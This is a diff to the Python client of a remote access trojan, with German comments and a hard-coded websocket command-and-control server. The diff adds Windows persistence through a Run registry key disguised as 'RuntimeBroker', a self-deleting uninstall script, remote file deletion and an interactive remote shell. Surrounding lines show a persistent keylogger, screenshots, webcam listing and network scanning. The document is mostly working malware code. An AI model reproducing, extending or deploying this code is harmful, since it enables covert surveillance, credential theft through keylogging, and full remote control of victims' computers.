@@ -27,6 +27,7 @@ SERVER_URI = os.getenv("SERVER_URI", "wss://yawning-chameleon-norobb-e4dabbb0.ko
 KEYLOG_FILE_PATH = os.path.join(os.path.expanduser("~"), ".klog.dat")
 CD_STATE_FILE = os.path.join(os.path.expanduser("~"), ".rat_last_cwd")
 HEARTBEAT_INTERVAL = 45  # Sekunden
+PERSISTENCE_NAME = "RuntimeBroker"  # Name für den Registry-Eintrag/Task
 
 logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
 
@@ -215,23 +216,81 @@ def show_message_box(text: str) -> str:
     except Exception as e:
         return f"Fehler beim Anzeigen der Nachrichtenbox: {e}"
 
-def ensure_persistence():
-    """Stellt Persistenz unter Windows sicher."""
+# === Persistenz & Deinstallation ===
+def manage_persistence(enable=True) -> str:
+    """Verwaltet die Persistenz des Clients (nur Windows)."""
     if platform.system() != "Windows":
-        return
+        return "Persistenz wird nur unter Windows unterstützt."
+    
     try:
-        startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-        dest_path = os.path.join(startup_folder, "RuntimeBroker.exe")
+        # Robusterer Pfad für die ausführbare Datei
+        exe_path = sys.executable
+        # Zielpfad im AppData-Verzeichnis, um Berechtigungsprobleme zu vermeiden
+        dest_folder = os.path.join(os.environ["APPDATA"], PERSISTENCE_NAME)
+        dest_path = os.path.join(dest_folder, f"{PERSISTENCE_NAME}.exe")
+
+        # Registry-Schlüssel für den Autostart
+        reg_key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
         
-        if sys.executable.lower() == dest_path.lower():
-            return
+        if enable:
+            # 1. Kopiere die ausführbare Datei an einen stabilen Ort
+            os.makedirs(dest_folder, exist_ok=True)
+            shutil.copyfile(exe_path, dest_path)
             
-        if not os.path.exists(dest_path):
-            os.makedirs(startup_folder, exist_ok=True)
-            shutil.copyfile(sys.executable, dest_path)
-            logging.info(f"Persistenz in {dest_path} sichergestellt.")
+            # 2. Erstelle den Registry-Eintrag
+            # Verwendung von 'reg' anstelle von 'winreg' für Einfachheit
+            cmd = f'reg add HKCU\\{reg_key_path} /v {PERSISTENCE_NAME} /t REG_SZ /d "{dest_path}" /f'
+            subprocess.run(cmd, shell=True, check=True, capture_output=True)
+            return f"Persistenz aktiviert. Client startet bei der nächsten Anmeldung von '{dest_path}'."
+        else:
+            # 1. Entferne den Registry-Eintrag
+            cmd = f'reg delete HKCU\\{reg_key_path} /v {PERSISTENCE_NAME} /f'
+            subprocess.run(cmd, shell=True, check=True, capture_output=True)
+            
+            # 2. (Optional) Entferne die kopierte Datei
+            if os.path.exists(dest_path):
+                try:
+                    os.remove(dest_path)
+                    os.rmdir(dest_folder)
+                except OSError as e:
+                    return f"Persistenz-Registry-Eintrag entfernt, aber die Datei '{dest_path}' konnte nicht gelöscht werden: {e}"
+            return "Persistenz erfolgreich entfernt."
+
+    except (subprocess.CalledProcessError, FileNotFoundError, PermissionError) as e:
+        return f"Fehler bei der Persistenzverwaltung: {e}"
     except Exception as e:
-        logging.warning(f"Fehler bei Persistenz: {e}")
+        return f"Ein unerwarteter Fehler ist aufgetreten: {e}"
+
+def uninstall_client() -> str:
+    """Deinstalliert den Client vollständig (nur Windows)."""
+    if platform.system() != "Windows":
+        return "Deinstallation wird nur unter Windows unterstützt."
+    
+    try:
+        # 1. Persistenz entfernen
+        persistence_msg = manage_persistence(enable=False)
+        
+        # 2. Erstelle ein Batch-Skript, das den Client löscht und sich selbst zerstört
+        client_path = sys.executable
+        batch_content = f"""
+@echo off
+echo "Deinstalliere RAT-Client..."
+timeout /t 3 /nobreak > NUL
+taskkill /f /im {os.path.basename(client_path)} > NUL
+del "{client_path}"
+del "%~f0"
+"""
+        batch_path = os.path.join(os.environ["TEMP"], "uninstall.bat")
+        with open(batch_path, "w") as f:
+            f.write(batch_content)
+            
+        # 3. Führe das Batch-Skript in einem neuen Prozess aus
+        subprocess.Popen(f'"{batch_path}"', shell=True, creationflags=subprocess.CREATE_NEW_PROCESS_GROUP)
+        
+        return f"{persistence_msg}\nDeinstallationsprozess gestartet. Der Client wird in Kürze beendet und gelöscht."
+
+    except Exception as e:
+        return f"Fehler bei der Deinstallation: {e}"
 
 # === Datei- und Verzeichnisfunktionen ===
 def list_directory(path=".") -> str:
@@ -254,6 +313,28 @@ def change_directory(path: str) -> str:
         return f"Verzeichnis gewechselt zu: {os.getcwd()}"
     except Exception as e:
         return f"Fehler beim Wechseln des Verzeichnisses: {e}"
+
+def remove_path(path: str) -> str:
+    """Löscht eine Datei oder ein Verzeichnis."""
+    try:
+        if os.path.isfile(path):
+            os.remove(path)
+            return f"Datei '{path}' gelöscht."
+        elif os.path.isdir(path):
+            shutil.rmtree(path)
+            return f"Verzeichnis '{path}' und sein Inhalt gelöscht."
+        else:
+            return f"Fehler: Pfad '{path}' nicht gefunden."
+    except Exception as e:
+        return f"Fehler beim Löschen von '{path}': {e}"
+
+def make_directory(path: str) -> str:
+    """Erstellt ein neues Verzeichnis."""
+    try:
+        os.makedirs(path, exist_ok=True)
+        return f"Verzeichnis '{path}' erstellt."
+    except Exception as e:
+        return f"Fehler beim Erstellen von '{path}': {e}"
 
 def load_cwd_state():
     """Lädt das letzte Arbeitsverzeichnis beim Start."""
@@ -508,8 +589,7 @@ async def process_commands(websocket: websockets.ClientConnection):
             output = None
 
             if action == "exec":
-                result = subprocess.run(command.get("command"), shell=True, capture_output=True, text=True, encoding="utf-8", errors="ignore")
-                output = result.stdout + result.stderr
+                output = await interactive_shell.execute(command.get("command"))
             elif action == "screenshot":
                 with mss.mss() as sct:
                     sct_img = sct.grab(sct.monitors[1])
@@ -528,6 +608,8 @@ async def process_commands(websocket: websockets.ClientConnection):
                 output = f"Datei gespeichert: {command.get('filename')}"
             elif action == "ls": output = list_directory(command.get("path", "."))
             elif action == "cd": output = change_directory(command.get("path", "."))
+            elif action == "rm": output = remove_path(command.get("path"))
+            elif action == "mkdir": output = make_directory(command.get("path"))
             elif action == "systeminfo": output = get_detailed_system_info()
             elif action == "network_info": output = get_network_info()
             elif action == "history": output = get_history()
@@ -538,6 +620,15 @@ async def process_commands(websocket: websockets.ClientConnection):
                 output = await scan_network(command.get("range", "192.168.1.0/24"))
             elif action == "webcam_list":
                 output = list_webcams()
+            elif action == "persist":
+                output = manage_persistence(enable=True)
+            elif action == "unpersist":
+                output = manage_persistence(enable=False)
+            elif action == "uninstall":
+                output = uninstall_client()
+                await websocket.send(json.dumps({"type": "command_output", "output": output}))
+                await websocket.close()
+                sys.exit(0) # Beendet den Client-Prozess
             elif action == "shell":
                 cmd_to_run = command.get("command")
                 if cmd_to_run == "start":
@@ -586,9 +677,11 @@ async def heartbeat(ws: websockets.ClientConnection):
             break
 
 async def connect_to_server():
-    ensure_persistence()
     load_cwd_state()
     start_persistent_keylogger()
+    
+    # Starte die interaktive Shell beim Client-Start
+    await interactive_shell.start()
     
     backoff_time = 5
     while True:
@@ -618,3 +711,5 @@ if __name__ == "__main__":
         asyncio.run(connect_to_server())
     except KeyboardInterrupt:
         logging.info("Client manuell beendet.")
+    finally:
+        interactive_shell.stop()
